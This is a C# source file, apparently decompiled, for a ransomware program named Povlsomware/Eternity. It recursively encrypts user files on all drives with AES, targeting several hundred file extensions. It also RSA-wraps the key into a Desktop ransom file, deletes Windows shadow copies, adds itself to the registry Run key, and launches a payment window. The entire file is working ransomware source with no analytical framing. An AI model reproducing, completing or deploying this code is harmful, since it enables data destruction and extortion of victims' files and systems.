using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using System.Xml.Serialization;
using Microsoft.Win32;

namespace Povlsomware;

internal class Program
{
	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static char[] password = randpass(16);

	private static readonly string[] extensionsToEncrypt = new string[788]
	{
		"7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite",
		"sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd",
		"wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd",
		"vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf",
		"kml", "kmz", "gpx", "cad", "wmf", "3fr", "ari", "arw", "bay", "bmp",
		"cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif", "iiq",
		"j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw", "orf",
		"pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf", "srw",
		"x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp", "asf",
		"avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf", "vob",
		"wmv", "txt", "php'", "html", "tar", "gz", "sql", "js", "css", "txt",
		"pdf", "tgz", "war", "jar", "java", "class", "ruby", "py", "cs", "zip",
		"db", "doc", "xls", "properties", "xml", "jpg", "jpeg", "gif", "mov", "avi",
		"wmv", "mp3", "mp4", "wma", "acc", "wav", "pem", "pub", "docx", "apk",
		"exe", "dll", "tpl", "psd", "asp", "phtml", "aspx", "csv", "sql", "mp4",
		"7z", "rar", "m4a", "wma", "avi", "wmv", "csv", "d3dbsp", "zip", "sie",
		"sum", "ibank", "t13", "t12", "qdf", "gdb", "tax", "pkpass", "bc6", "bc7",
		"bkp", "qic", "bkf", "sidn", "sidd", "mddata", "itl", "itdb", "icxs", "hvpl",
		"hplg", "hkdb", "mdbackup", "syncdb", "gho", "cas", "svg", "map", "wmo", "itm",
		"sb", "fos", "mov", "vdf", "ztmp", "sis", "sid", "ncf", "menu", "layout",
		"dmp", "blob", "esm", "vcf", "vtf", "dazip", "fpk", "mlx", "kf", "iwd",
		"vpk", "tor", "psk", "rim", "w3x", "fsh", "ntl", "arch00", "lvl", "snx",
		"cfr", "ff", "vpp_pc", "lrf", "m2", "mcmeta", "vfs0", "mpqge", "kdb", "db0",
		"dba", "rofl", "hkx", "bar", "upk", "das", "iwi", "litemod", "asset", "forge",
		"ltx", "bsa", "apk", "re4", "sav", "lbf", "slm", "bik", "epk", "rgss3a",
		"pak", "big", "wallet", "wotreplay", "xxx", "desc", "py", "m3u", "flv", "js",
		"css", "rb", "png", "jpeg", "txt", "p7c", "p7b", "p12", "pfx", "pem",
		"crt", "cer", "der", "x3f", "srw", "pef", "ptx", "r3d", "rw2", "rwl",
		"raw", "raf", "orf", "nrw", "mrwref", "mef", "erf", "kdc", "dcr", "cr2",
		"crw", "bay", "sr2", "srf", "arw", "3fr", "dng", "jpe", "jpg", "cdr",
		"indd", "ai", "eps", "pdf", "pdd", "psd", "dbf", "mdf", "wb2", "rtf",
		"wpd", "dxg", "xf", "dwg", "pst", "accdb", "mdb", "pptm", "pptx", "ppt",
		"xlk", "xlsb", "xlsm", "xlsx", "xls", "wps", "docm", "docx", "doc", "odb",
		"odc", "odm", "odp", "ods", "odt", "odt", "ods", "odp", "odm", "odc",
		"odb", "doc", "docx", "docm", "wps", "xls", "xlsx", "xlsm", "xlsb", "xlk",
		"ppt", "pptx", "pptm", "mdb", "accdb", "pst", "dwg", "dxf", "dxg", "wpd",
		"rtf", "wb2", "mdf", "dbf", "psd", "pdd", "pdf", "eps", "ai", "indd",
		"cdr", "dng", "3fr", "arw", "srf", "sr2", "mp3", "bay", "crw", "cr2",
		"dcr", "kdc", "erf", "mef", "mrw", "nef", "nrw", "orf", "raf", "raw",
		"rwl", "rw2", "r3d", "ptx", "pef", "srw", "x3f", "der", "cer", "crt",
		"pem", "pfx", "p12", "p7b", "p7c", "jpg", "png", "jfif", "jpeg", "gif",
		"bmp", "exif", "txt", "3fr", "accdb", "ai", "arw", "bay", "cdr", "cer",
		"cr2", "crt", "crw", "dbf", "dcr", "der", "dng", "doc", "docm", "docx",
		"dwg", "dxf", "dxg", "eps", "erf", "indd", "jpe", "jpg", "kdc", "mdb",
		"mdf", "mef", "mrw", "nef", "nrw", "odb", "odm", "odp", "ods", "odt",
		"orf", "p12", "p7b", "p7c", "pdd", "pef", "pem", "pfx", "ppt", "pptm",
		"pptx", "psd", "pst", "ptx", "r3d", "raf", "raw", "rtf", "rw2", "rwl",
		"srf", "srw", "wb2", "wpd", "wps", "xlk", "xls", "xlsb", "xlsm", "xlsx",
		"wb2", "psd", "p7c", "p7b", "p12", "pfx", "pem", "crt", "cer", "der",
		"pl", "py", "lua", "css", "js", "asp", "php", "incpas", "asm", "hpp",
		"h", "cpp", "c", "7z", "zip", "rar", "drf", "blend", "apj", "3ds",
		"dwg", "sda", "ps", "pat", "fxg", "fhd", "fh", "dxb", "drw", "design",
		"ddrw", "ddoc", "dcs", "csl", "csh", "cpi", "cgm", "cdx", "cdrw", "cdr6",
		"cdr5", "cdr4", "cdr3", "cdr", "awg", "ait", "ai", "agd1", "ycbcra", "x3f",
		"stx", "st8", "st7", "st6", "st5", "st4", "srw", "srf", "sr2", "sd1",
		"sd0", "rwz", "rwl", "rw2", "raw", "raf", "ra2", "ptx", "pef", "pcd",
		"orf", "nwb", "nrw", "nop", "nef", "ndd", "mrw", "mos", "mfw", "mef",
		"mdc", "kdc", "kc2", "iiq", "gry", "grey", "gray", "fpx", "fff", "exf",
		"erf", "dng", "dcr", "dc2", "crw", "craw", "cr2", "cmt", "cib", "ce2",
		"ce1", "arw", "3pr", "3fr", "mpg", "jpeg", "jpg", "mdb", "sqlitedb", "sqlite3",
		"sqlite", "sql", "sdf", "sav", "sas7bdat", "s3db", "rdb", "psafe3", "nyf", "nx2",
		"nx1", "nsh", "nsg", "nsf", "nsd", "ns4", "ns3", "ns2", "myd", "kpdx",
		"kdbx", "idx", "ibz", "ibd", "fdb", "erbsql", "db3", "dbf", "db-journal", "db",
		"cls", "bdb", "al", "adb", "backupdb", "bik", "backup", "bak", "bkp", "moneywell",
		"mmw", "ibank", "hbk", "ffd", "dgc", "ddd", "dac", "cfp", "cdf", "bpw",
		"bgt", "acr", "ac2", "ab4", "djvu", "pdf", "sxm", "odf", "std", "sxd",
		"otg", "sti", "sxi", "otp", "odg", "odp", "stc", "sxc", "ots", "ods",
		"sxg", "stw", "sxw", "odm", "oth", "ott", "odt", "odb", "csv", "rtf",
		"accdr", "accdt", "accde", "accdb", "sldm", "sldx", "ppsm", "ppsx", "ppam", "potm",
		"potx", "pptm", "pptx", "pps", "pot", "ppt", "xlw", "xll", "xlam", "xla",
		"xlsb", "xltm", "xltx", "xlsm", "xlsx", "xlm", "xlt", "xls", "xml", "dotm",
		"dotx", "docm", "docx", "dot", "doc", "txt", "odt", "ods", "odp", "odm",
		"odc", "odb", "doc", "docx", "docm", "wps", "xls", "xlsx", "xlsm", "xlsb",
		"xlk", "ppt", "pptx", "pptm", "mdb", "accdb", "pst", "dwg", "dxf", "dxg",
		"wpd", "rtf", "wb2", "mdf", "dbf", "psd", "pdd", "pdf", "eps", "ai",
		"indd", "cdr", "jpg", "jpe", "jpg", "dng", "3fr", "arw", "srf", "sr2",
		"bay", "crw", "cr2", "dcr", "kdc", "erf", "mef", "mrw", "nef", "nrw",
		"orf", "raf", "raw", "rwl", "rw2", "r3d", "ptx", "pef", "srw", "x3f",
		"der", "cer", "crt", "pem", "pfx", "p12", "p7b", "p7c"
	};

	[STAThread]
	public static char[] GetPass()
	{
		return password;
	}

	private static void Main()
	{
		Encrypt_pass();
		start();
	}

	public static void Encrypt_pass()
	{
		string s = "<?xml version=\"1.0\" encoding=\"utf - 16\"?><RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><Exponent>AQAB</Exponent><Modulus>2bDwgNO/DtLmp4tPvrnndDrEO9cMBNYnugR7i1gIIDlm9ItADKcN0ozASh2FvqyxlQGEXJVDHczLXEWsnM8Vduk1T1esqRw9ZYwsRwe7+UunA+1952Jrk0ynf71qfAmqVhIoECgk+/SoT+Z/l3ppodpUPNtK2Ggazs/U7vCCFXSHFv+Wgwc20azUMYflJSlOS9/7C17NB6j0Bn7kQfappEiBJsXv9T1Pe3Ife3O2eLLLeKdsQxjDJ7iugeXE1g5xRxsjr/8gkZLhkkCnXiAEXQcjI0X84uhcLJxHxQ36rpO6Xmb5gfoCJotRh+FChc62tkWv0/W7lYhpLI+Br6/37Q==</Modulus></RSAParameters>";
		StringReader textReader = new StringReader(s);
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
		RSAParameters parameters = (RSAParameters)xmlSerializer.Deserialize(textReader);
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.ImportParameters(parameters);
		string s2 = new string(password);
		byte[] bytes = Encoding.Unicode.GetBytes(s2);
		byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false);
		string contents = Convert.ToBase64String(inArray);
		File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\sendme.eternityraas", contents);
	}

	public static char[] randpass(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890."[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.".Length)]);
		}
		string text = stringBuilder.ToString();
		return text.ToCharArray();
	}

	public static void start()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				Attack(driveInfo.Name);
			}
		}
		DestroyCopy();
		SetStartup();
		CreateUI();
	}

	private static void SetStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("Eternity") == null && !Application.get_ExecutablePath().Contains("rundll32.exe"))
		{
			registryKey.SetValue("Eternity", "\"" + Application.get_ExecutablePath() + "\"");
		}
	}

	private static void CreateUI()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		PayM3 payM = new PayM3();
		Application.Run((Form)(object)payM);
	}

	public static void DecryptFile(string fileEncrypted, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted).Skip(3).ToArray();
		byte[] array = AES_Decrypt(bytesToBeDecrypted, bytes);
		FileStream fileStream = File.Open(fileEncrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileEncrypted, FileMode.Append);
		fileStream2.Write(array, 0, array.Length);
	}

	public static void DestroyCopy()
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(ntIdentity);
			flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		if (!flag)
		{
			return;
		}
		string text = "\\\\.\\ROOT\\cimv2";
		string text2 = "Win32_ShadowCopy";
		ManagementClass val = new ManagementClass(text + ":" + text2);
		try
		{
			ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					val2.Delete();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
	}

	public static void EncryptFile(string fileUnencrypted)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeEncrypted = File.ReadAllBytes(fileUnencrypted);
		byte[] array = AES_Encrypt(bytesToBeEncrypted, bytes);
		FileStream fileStream = File.Open(fileUnencrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileUnencrypted, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes("Eth");
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			count++;
			encryptedFiles.Add(fileUnencrypted);
		}
	}

	public static void Attack(string startDirectory)
	{
		ProcessDirectory(startDirectory, 1, "");
	}

	public static void UndoAttack(string decryption_password)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				ProcessDirectory(driveInfo.Name, 0, decryption_password);
			}
		}
	}

	public static void ProcessDirectory(string targetDirectory, int action, string password)
	{
		IEnumerable<string> enumerable = from file in Directory.EnumerateFiles(targetDirectory, "*.*")
			where extensionsToEncrypt.Any((string x) => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))
			select file;
		foreach (string item in enumerable)
		{
			ProcessFile(item, action, password);
		}
		string[] directories = Directory.GetDirectories(targetDirectory);
		string[] array = directories;
		foreach (string text in array)
		{
			try
			{
				if (!text.Contains("All Users\\Microsoft\\") && !text.Contains("$Recycle.Bin") && !text.Contains("C:\\Windows") && !text.Contains("C:\\Program Files") && !text.Contains("Temporary Internet Files") && !text.Contains("AppData\\") && !text.Contains("\\source\\") && !text.Contains("C:\\ProgramData\\") && !text.Contains("\\Eternity\\"))
				{
					ProcessDirectory(text, action, password);
				}
			}
			catch
			{
			}
		}
	}

	public static bool IsMarked(string fileName)
	{
		byte[] bytes = Encoding.ASCII.GetBytes("Eth");
		byte[] second = File.ReadAllBytes(fileName).Take(3).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(fileName);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string fileName, int action, string password)
	{
		if (action == 1 && !IsMarked(fileName))
		{
			try
			{
				EncryptFile(fileName);
				return;
			}
			catch
			{
				return;
			}
		}
		if (action == 0 && IsMarked(fileName))
		{
			try
			{
				DecryptFile(fileName, password);
			}
			catch
			{
			}
		}
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}
}
